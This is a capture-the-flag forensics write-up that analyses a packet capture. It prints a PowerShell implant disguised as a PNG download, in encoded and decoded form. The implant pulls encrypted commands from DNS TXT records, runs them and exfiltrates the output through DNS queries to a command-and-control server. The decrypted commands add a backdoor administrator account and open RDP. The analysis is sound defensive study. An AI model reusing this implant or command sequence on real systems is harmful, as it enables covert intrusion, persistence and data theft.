---
layout: default
title: Automation
---

# [Cyber Apocalypse](index.md) - Forensics - Automation

In this challenge we are given `capture.pcap`.

After quite a lot of exploring this file in Wireshark, a number of DNS queries stand out as odd. 

```
start.windowsliveupdater.com: type A, class IN
CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com: type A, class IN
32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com: type A, class IN
C1006AC8A03F9776B08321BD6D5247BB.windowsliveupdater.com: type A, class IN
end.windowsliveupdater.com: type A, class IN
```

`windowsliveupdater.com` doesn't seem like a legit domain (the "r" at the end seems out of place). `dig` gives me several IPs, and `whois` tells me that they are both from CloudFlare - not Microsoft. Visiting http://windowsliveupdater.com redirects us Rick Astley on youtube, so this looks like the first clue.

The subdomains from the above snippet don't exist, so obviously something is communicating via DNS requests - but at this point I am not sure how.

Using Wireshark to search for `windowsliveupdater.com`, the first frame that mentions it is:

```
1922	18.910942	192.168.1.1	10.0.2.15	DNS	98	Standard query response 0xab7e A WINDoWslIVeupDATeR.cOM A 77.74.198.52
```
Right below this isn HTTP transaction to the IP `77.74.198.52`, and a file was downloaded - `desktop.png`.

Using Wireshark to "follow" this HTTP transaction, we can see the downloaded file

```
GET /desktop.png HTTP/1.1
Host: windowsliveupdater.com
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 May 2022 15:42:16 GMT
Content-Type: image/png
Content-Length: 3561
Last-Modified: Wed, 04 May 2022 15:23:46 GMT
Connection: keep-alive
ETag: "62729a82-de9"
Accept-Ranges: bytes

ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==
```

This doesn't look like an image to me - it looks more like something obscured by base64 encoding. Decoding it gives us a powershell script:


```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-","")
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
$key = "a1E4MUtycWswTmtrMHdqdg=="
$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
for ($num = 0 ; $num -le $out.Length-2; $num++){
$encryptedString = $out[$num].Strings[0]
$backToPlainText = Decrypt-String $key $encryptedString
$output = iex $backToPlainText;$pr = Encrypt-String $key $output|parts 32
Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
for ($ans = 0; $ans -lt $pr.length-1; $ans++){
$domain = -join($pr[$ans],".windowsliveupdater.com")
Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
    }
Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
}
```
Looks like there is some AES encryption involved, and we have a key - `a1E4MUtycWswTmtrMHdqdg==`, or `kQ81Krqk0Nkk0wjv` if base64 decoded. Looking closer at the encryption function, the Initialization Vector (IV) is concatenated with the encrypted output, so it's going to be different for every command, but at least we know where to find it later when we want to decrypt stuff.

This script appears to be what is communicating using DNS requests.
It looks like this script does an initial DNS query for TXT records, decrypts them, runs them (so they must be commands), and then sends back the output via DNS requests.

First I will try to find what the commands are, then I will explore how the data is transmitted back via DNS.

## Finding the initial commands
The script makes an initial DNS request to `147.182.172.189`, looking for TXT records, so that should be easy enough to find.

Setting my Wireshark filter to simply `dns.txt` gives me exactly 1 frame:
```
2063	20.516412	147.182.172.189	10.0.2.15	DNS	905	Standard query response 0x207b TXT windowsliveupdater.com TXT TXT TXT TXT TXT TXT TXT
```
And it looks like it responded with several results.

```
Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=
```

```
hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=
```

```
58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=
```

```
eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru
```

```
BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=
```

```
vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=
```

```
M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh
```

These are all base64 encoded ciphertext, so decoding them won't do us any good right now, we'll need to decrypt them.

The decrypt function in the script looks like it's designed to accept base64 strings directly, so it should be simple enough to write a script to decrypt these using bits from the original script.

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
     
        }
        else {
            $aesManaged.IV = $IV
     

        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {
  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

$key = "a1E4MUtycWswTmtrMHdqdg=="

$ciphertext_b64 = @(
    "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=",
    "hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=",
    "58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=",
    "eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru",
    "BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=",
    "vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=",
    "M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh"
)

foreach($ct in $ciphertext_b64) {
    $decrypted = Decrypt-String $key $ct
    write-host $decrypted
}
```
Gives us the commands that the script ran:

```
hostname
whoami
ipconfig
wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr
netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
net start TermService
```
The password that the script gave it's user - `JHBhcnQxPSdIVEJ7eTB1X2M0bl8n` looked like it might be a base64 encoded flag in disguise, and... and it was, but only the first half.

`$part1='HTB{y0u_c4n_'`

## Decrypting the responses

## The first part of the flag
The second half of the key must be encoded in the DNS-based communication, so we'll need to figure out how to decrypt that.

Spending *many hours* examining the script, it appears to work by:
 - Running an initial DNS entry to `windowsliveupdater.com` using the server `147.182.172.189`
 - Decoding and decrypting the TXT records that it gets back
 - Running the decrypted commands
 - Encrypting each command output, concatenating the ciphertext onto a unique initialization vector. 
   - The encryption function returns the byte array, with each byte converted to hex, and concatenated into one big string.
 - Each encrypted command output is then split into 32-character long chunks
 - Then, for each command output:
   - A DNS request is sent to `start.windowsliveupdater.com`
   - A DNS request is then sent for each 32-character long chunk (ie: `CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com`)
   - A final DNS request is sent to `end.windowsliveupdater.com`

The initialization vector, which we'll need to decrypt this, is going to be the first 16 bytes of the first 32-character long chunk. Each additional chunk in a group would be ciphertext only.

It turns out that this script is equipped to decrypt the initial commands from the TXT records, but *not* the encrypted responses it sends back. They are both using AES with the same key, but the functions are not interopable, so we'll need to make our own.

To decrypt this, we'll need to:
 - Reassemble a group of DNS queries between a `start` and `end` query
 - Convert the entire string to a byte array
 - Extract the first 16 byes as the IV
 - Decrypt the rest of the string using the IV and the key
 - Convert the decrypted bytes into characters that we can read

```powershell
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {

        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Create-AesKey() {  
    $aesManaged = Create-AesManagedObject $key $IV
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData    
    #write-host "ENC-RAWBYTES: $fullData"   
    #write-host "ENC-BITCONV : $([System.BitConverter]::ToString($fullData))"
    $aesManaged.Dispose()
    [System.BitConverter]::ToString($fullData).replace("-", "")
}

function Decrypt-DNS-Request-String($key, $encryptedStringWithIV) {
    
    # Split into pairs of characters
    $rawPairs = @()
    for ($x = 0; $x -lt $encryptedStringWithIV.Length; $x = $x + 2) {
        $rawPairs += "$($encryptedStringWithIV[$x])$($encryptedStringWithIV[$x+1])"
    }

    # Convert characters to ints
    $rawHexBytes = @()
    foreach($b in $rawPairs) {
        $rawHexBytes += [System.Convert]::ToInt64($b, 16)
    }
    
    $bytes = $rawHexBytes

    # Extract the IV
    $IV = $bytes[0..15]

    # Extract the ciphertext
    $Ciphertext = $bytes[16..$encryptedStringWithIV.length]    

    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($Ciphertext, 0, $Ciphertext.Length);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}


$key = "a1E4MUtycWswTmtrMHdqdg=="

$DNSResponses = @(
    @(
        "C1006AC8A03F9776B08321BD6D5247BB"
        "CC1C9AC2958A2E63609272E2B4F8F436"
        "32A806549B03AB7E4EB39771AEDA4A1B"
    ),
    @(
        "7679895D1CF7C07BB6A348E1AA4AFC65"
        "5958A6856F1A34AAD5E97EA55B087670"
        "35F2497E5836EA0ECA1F1280F59742A3"
    ),
    @(
        "09E28DD82C14BC32513652DAC2F2C27B"
        "0D73A3288A980D8FCEF94BDDCF9E2822"
        "2A1CA17BB2D90FCD6158856348790414"
        "20FC39C684A9E371CC3A06542B666005"
        "5840BD94CCE65E23613925B4D9D2BA53"
        "18EA75BC653004D45D505ED62567017A"
        "6FA4E7593D83092F67A81082D9930E99"
        "BA20E34AACC4774F067442C6622F5DA2"
        "A9B09FF558A8DF000ECBD37804CE663E"
        "3521599BC7591005AB6799C57068CF0D"
        "C6884CECF01C0CD44FD6B82DB788B35D"
        "62F02E4CAA1D973FBECC235AE9F40254"
        "C63D3C93C89930DA2C4F42D9FC123D8B"
        "AB00ACAB5198AFCC8C6ACD81B19CD264"
        "CC6353668CEA4C88C8AEEA1D58980022"
        "DA8FA2E917F17C28608818BF550FEA66"
        "973B5A8355258AB0AA281AD88F5B9EB1"
        "03AC666FE09A1D449736335C09484D27"
        "1C301C6D5780AB2C9FA333BE3B0185BF"
        "071FB1205C4DBEAA2241168B0748902A"
        "6CE14903C7C47E7C87311044CB9873A4"
    ),
    @(
        "ECABC349D27C0B0FFFD1ACEEDBE06BB6"
        "C2EB000EE4F9B35D6F001500E85642A2"
        "DCC8F1BE2CF4D667F458C1DE46D24B1C"
        "2E0F5D94E52649C70402C1B0A2FF7B49"
        "FC32DDD67F275307A74B2C4D0864B3F0"
        "486186DA9443EB747F717B3911C959DC"
        "7E300844D60655410C3988238E615D61"
        "6F33D27F63CE4D1E065A416911BC50D4"
        "58749599D2CB08DB561988EB2902E05D"
        "9886FDDAC2BED6F6DA73637AD2F20CF1"
        "99B8CE3D9DEE03C0180C7D1198B49C02"
        "769E5EE4EAB896D7D3BB478EA1408167"
        "79472A243BFB0852AF372323EC132988"
        "3C81A3F2AEB1D3DAAE8496E1DBF97F43"
        "5AE40A09203B890C4A174D77CB7026C4"
        "E990A6FB6424A7501823AD31D3D6B634"
        "4C7971C8D447C078C4471732AD881C39"
        "4BC8B1A66E0BED43DDC359269B57D1D5"
        "D68DCD2A608BF61716BB47D6FE4D5C9D"
        "6E8BB2981F214A8234B0DD0210CA96EB"
        "2D6322B0F7F3D748C4C9F8B80EFF5A69"
        "21A3D1A8621A49F4D29BC9851D25230B"
    ),
    @(
        "841BDB4E9E5F8BF721B58E8308177B57"
        "2E9A015967DA5BF11AC9155FC2159C8F"
        "610CD82F818B4BDF5E48722DAF4BEEEB"
        "ABCE30583F503B484BF99020E28A1B8F"
        "282A23FEB3A21C3AD89882F5AC0DD3D5"
        "7D87875231652D0F4431EC37E51A09D5"
        "7E2854D11003AB6E2F4BFB4F7E2477DA"
        "A44FCA3BC6021777F03F139D458C0524"
    ),
    @(
        "AE4ABE8A3A88D21DEEA071A72D65A35E"
        "F158D9F025897D1843E37B7463EC7833"
    )
)

foreach($chunk in $DNSResponses) {
    # Just an empty line to separate results
    write-output ""
    $full_chunk = ""
    foreach($part in $chunk) {
        $full_chunk += $part
    }
    $decrypted = Decrypt-DNS-Request-String $key $full_chunk
    write-output $decrypted
}

```

There may have been an easier way to extract the DNS queries from wireshark, but I copied and pasted them one at a time into the powershell script. The wireshark filter `ip.src == 147.182.172.189` made this a bit easier.

The command output for each command was:

```
intergalacticopc
```
*some extra characters removed from above - it's the pc name*

```
intergalacticop\sysadmin
```
```
Windows IP Configuration   Ethernet adapter Ethernet:     Connection-specific DNS Suffix  . : home    Link-local IPv6 Address . . . . . : fe80::fdbd:2c54:d6b:c384%6    IPv4 Address. . . . . . . . . . . : 10.0.2.15    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 10.0.2.2
```

```
companyName=Panaman  displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de}  instanceGuid={CD3EA3C2-91CB-4359-90DC-1E909147B6B0}  onAccessScanningEnabled=TRUE  pathToSignedProductExe=panantivirus://  productHasNotifiedUser=  productState=  productUptoDate=TRUE  productWantsWscNotifications=  versionNumber=4.0.0.1
```

```
The command completed successfully.  The command completed successfully.  The command completed successfully. 
```

```
Ok.
```

I only found 6 groups of data transmitted via DNS queries, though there were 7 commands. Perhaps one of the commands didn't produce an output.

And, in the largest of the encrypted command outputs we find the second half of the flag.

```
$part2=4utom4t3_but_y0u_c4nt_h1de}
```
```
HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
```